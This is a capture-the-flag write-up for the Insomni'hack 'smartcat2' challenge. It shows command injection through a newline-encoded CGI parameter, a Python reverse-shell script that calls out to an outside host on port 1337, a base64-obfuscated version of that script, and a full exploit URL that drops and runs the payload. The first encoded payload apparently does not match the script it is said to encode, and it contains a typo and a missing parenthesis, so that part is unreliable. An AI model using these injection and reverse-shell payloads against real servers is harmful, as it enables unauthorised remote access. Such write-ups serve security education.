# Insomni'hack : smartcat2

#### Author: Wh1t3Fox

**Description**:
> This challenge was an extension of the smartcat1. This time we needed to access a file in /home/smartcat.

The first thing we tried to do was view the contents of the /home/smartcat directory. We were able
to accomplish this by modifying the CDPATH environment variable with:

    http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=google.com%0ACDPATH=/home/smartcat%0Acd%0Als

This revealed there were two files: flag2 and readflag.

We tried to cat both files, however, we did not have read permission for flag2 and readflag was an executible. When running strings on readflag we could read the following message:

    Almost there... just trying to make sure you can execute arbitrary commands....
    Write 'Give me a...' on my stdin, wait 2 seconds, and then write '... flag!'.
    Do not include the quotes. Each part is a different line.

This was a definite sign that we needed to get a shell on the remote machine.

We came up with a payload to gain a reverse shell, but we struggled to find a way to actually execute the code with all of the character restrictions. We came up with the following code to get a reverse bash shell:

    import socket
    import subprocess
    import os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("wh1t3fox.net",1337))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])

To eliminate invalid characters and make the payload smaller we compressed the code and then converted it to base64. This lead to our final payload:

    exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiwxMjM0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzc2giLCItaSJdKTs='.decode('base64'))

This payload only had 2 invalid characters which were *'('*. We discovered in bash we could print  \x28 which would translate to the '(' character. The only issue now was how to deliver the payload on the server.

Using more cat tricks we realized we could cat a string to a file and then pass the file to the python interpreter for execution.

    python>/tmp/exploit.py<<EOF
    print"exec\x28'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIndoMXQzZm94Lm5ldCIsMTMzNykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL2Jhc2giLCItaSJdKTs='.decode\x28'base64'))"
    EOF
    python</tmp/exploit.py

Our final exploit was:

    http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=google.com%0Apython>/tmp/exploit.py<<EOF%0Aprint"exec\x28'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIndoMXQzZm94Lm5ldCIsMTMzNykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL2Jhc2giLCItaSJdKTs='.decode\x28'base64'))"%0AEOF%0Apython</tmp/exploit.py

After we launched the url we received a reverse shell on the server and executed the readflag file allowing us to retrieve the flag.

    INS{shells_are _way_better_than_cats}
